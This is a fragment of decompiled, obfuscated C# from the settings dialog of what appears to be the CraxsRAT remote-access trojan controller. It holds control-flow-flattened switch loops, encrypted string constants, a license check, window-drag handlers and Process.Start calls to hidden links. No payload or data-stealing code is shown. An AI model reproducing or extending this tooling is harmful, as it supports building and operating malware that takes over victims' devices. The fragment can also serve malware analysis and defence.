                  int num9 = Operators.CompareString(language, EXGuarder.\u00365514E04, false) == 0 ? -479882121 : (num9 = -2017500747);
                  num3 = num9 ^ (int) num4 * 1079130858;
                  continue;
                case 18:
                  language = RegistryHandler.Get_Language();
                  int num10 = Operators.CompareString(language, EXGuarder.\u0033E0E295A, false) == 0 ? 868427789 : (num10 = 1589012560);
                  num3 = num10 ^ (int) num4 * 1937340978;
                  continue;
                case 19:
                  updatesScreen = new UpdatesScreen();
                  num3 = -422318385;
                  continue;
                case 20:
                  num3 = (int) num4 * 1767763733 ^ -400169125;
                  continue;
                default:
                  goto label_35;
              }
            }
label_10:
            return;
label_3:
            return;
label_35:
            return;
label_21:
            Codes.MyMsgBox(EXGuarder.\u0031A0C5855, EXGuarder.\u00338701670, false, Craxs_Rat.My.Resources.Resources.sucess48px);
            return;
label_17:
            Left3 = Codes.Encrypt(Codes.hashmd5(Application.ExecutablePath), EXGuarder.\u00339455647);
            num3 = -768567419;
            goto label_9;
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            Codes.MyMsgBox(EXGuarder.\u0035D290F5C, EXGuarder.\u0036C0D1821, false, Craxs_Rat.My.Resources.Resources.error48px);
            ProjectData.ClearProjectError();
            return;
          }
        }
        else
        {
          Codes.MyMsgBox(EXGuarder.\u0035D290F5C, EXGuarder.\u0036C0D1821, false, Craxs_Rat.My.Resources.Resources.error48px);
          return;
        }
label_33:
        Codes.MyMsgBox(EXGuarder.\u0035D290F5C, EXGuarder.\u0036C0D1821, false, Craxs_Rat.My.Resources.Resources.error48px);
        int num11 = -659386106;
        while (true)
        {
          uint num12;
          switch ((num12 = (uint) (num11 - (~(-1642338819 ^ 115498761) + 1282443216 - ((2146212229 ^ 1335090251 ^ -512467009 ^ ~(1760872589 * -941663097)) + --~-1830428178)) ^ 127374163 + ~(962206396 - -804144127 - -1486609817) ^ ~-1076824539 - -2115557251 ^ -(1546443095 * -500847490) ^ -493894616)) % 3U)
          {
            case 0:
              num11 = -1025134585;
              continue;
            case 1:
              goto label_36;
            case 2:
              goto label_33;
            default:
              goto label_37;
          }
        }
label_36:
        return;
label_37:;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        Codes.MyMsgBox(EXGuarder.\u0035D290F5C, EXGuarder.\u0036C0D1821, false, Craxs_Rat.My.Resources.Resources.error48px);
        ProjectData.ClearProjectError();
      }
    }

    private void PictureBox5_Click(object sender, EventArgs e)
    {
      try
      {
        Process.Start(EXGuarder.\u003243E560C);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    private void PictureBox6_Click(object sender, EventArgs e)
    {
      try
      {
        Process.Start(EXGuarder.\u00302750B6C);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    private void PictureBox3_Click(object sender, EventArgs e)
    {
      try
      {
        Process.Start(EXGuarder.\u0031C0D631A);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
label_2:
        int num1 = 1730301137;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) ---(-(num1 ^ 1032374303 * --1942232645 - -(-1263218303 * 1287544675) - ~(-1727412710 - 1589857949 * 1139895237) - -(-(2038945251 - 1181136749) - (-1980754824 * -267474005 ^ -1001515985))) - ~(894736809 * (-1282876019 - 1043834649)))) % 3U)
          {
            case 0:
              goto label_2;
            case 1:
              ProjectData.ClearProjectError();
              num1 = (int) num2 * 577609971 ^ -825175383;
              continue;
            case 2:
              goto label_4;
            default:
              goto label_6;
          }
        }
label_4:
        return;
label_6:;
      }
    }

    private void DrakeUISymbolLabel1_MouseDown(object sender, MouseEventArgs e)
    {
      if (e.Button != MouseButtons.Left)
        return;
label_1:
      int num1 = 538333984;
      while (true)
      {
        int num2 = num1;
        uint num3;
        switch ((num3 = (uint) ~(-1467150347 - 1145915875 - -(num2 - (-(--739888676 - ~2001573556) - 919146073 * ~(-1662871508 - 260789807) ^ ~(-1829840486 * 489819421 - -706117578) - (~1920104130 - 389519468)) - 1780152723 * (-1120546231 * -182506821)) * 1119742441)) % 4U)
        {
          case 0:
            goto label_6;
          case 1:
            Codes.ReleaseCapture();
            num1 = (int) num3 * -255516328 ^ -769604194;
            continue;
          case 2:
            goto label_1;
          case 3:
            Codes.SendMessage(this.Handle, 161, 2, 0);
            num1 = (int) num3 * -738192678 ^ -811383357;
            continue;
          default:
            goto label_7;
        }
      }
label_6:
      return;
label_7:;
    }

    private void Panel1_MouseDown(object sender, MouseEventArgs e)
    {
      if (e.Button != MouseButtons.Left)
        return;
label_1:
      int num1 = -663015921;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) -((num1 ^ -((-593847807 ^ ~181761177) - ((-935878476 ^ -1181346241) + (1306648406 ^ 1058552420))) * 773442407 ^ -1168380513 * 1809285819) - (~-2076701127 + 1875670899) - 885355948 - (456389339 + 893479322))) % 4U)
        {
          case 0:
            goto label_1;
          case 1:
            goto label_6;
          case 2:
            Codes.ReleaseCapture();
            num1 = (int) num2 * 542614669 ^ 41929326;
            continue;
          case 3:
            Codes.SendMessage(this.Handle, 161, 2, 0);
            num1 = (int) num2 * -782775268 ^ 2019219234;
            continue;
          default:
            goto label_7;
        }
      }
label_6:
      return;
label_7:;
    }

    private void Panel2_MouseDown(object sender, MouseEventArgs e)
    {
      if (e.Button != MouseButtons.Left)
        return;
label_1:
      int num1 = -1599860126;
      while (true)
      {
        int num2 = num1;
        uint num3;
        switch ((num3 = (uint) ((601249968 ^ -1278822631) - (num2 - (252230923 * -(1903852415 * -1778610325) + ((1620937163 ^ 1603872803 ^ 1200664670) - -(-1530717795 ^ -815631308)) + (~4674478 - (275452990 ^ -134070645) + ~~-152349192 ^ ---486241391 ^ -1990403411)) + ~(-591200473 - (837661172 - 1118828356 ^ -426872750 - -1687946248)) + ~(~2000760434 + (236167842 ^ 1032230917)) ^ 119030369) - -928545896)) % 3U)
        {
          case 0:
            goto label_1;
          case 1:
            goto label_5;
          case 2:
            Codes.ReleaseCapture();
            Codes.SendMessage(this.Handle, 161, 2, 0);
            num1 = (int) num3 * 373689447 ^ -1748494709;
            continue;
          default:
            goto label_6;
        }
      }
label_5:
      return;
label_6:;
    }

    private void DrakeUIButtonIcon2_Click(object sender, EventArgs e) => this.Close();

    private void Label17_Click(object sender, EventArgs e)
    {
    }

    public CraxsSettings()
    {
      this.Load += new EventHandler(((Dialog1) this).Dialog1_Load);
      ((Dialog1) this).InitializeComponent();
    }

    [DebuggerNonUserCode]
    protected override void Dispose(bool disposing)
    {
      try
      {
        if (!disposing)
          return;
label_1:
        int num1 = -1104866843;
        while (true)
        {
          int num2 = num1;
          uint num3;
          switch ((num3 = (uint) (~2039255205 - -~-1322416267 - ~num2 * 1897491761)) % 4U)
          {
            case 0:
              goto label_1;
            case 1:
              goto label_3;
            case 2:
              int num4 = ((Drooper) this).components == null ? -931183726 : (num4 = -283185448);
              num1 = num4 ^ (int) num3 * -49832571;
              continue;
            case 3:
              ((Drooper) this).components.Dispose();
              num1 = (int) num3 * -813898267 ^ -1270827685;
              continue;
            default:
              goto label_8;
          }
        }
label_3:
        return;
label_8:;
      }
      finally
      {
        base.Dispose(disposing);
      }
    }
  }
}
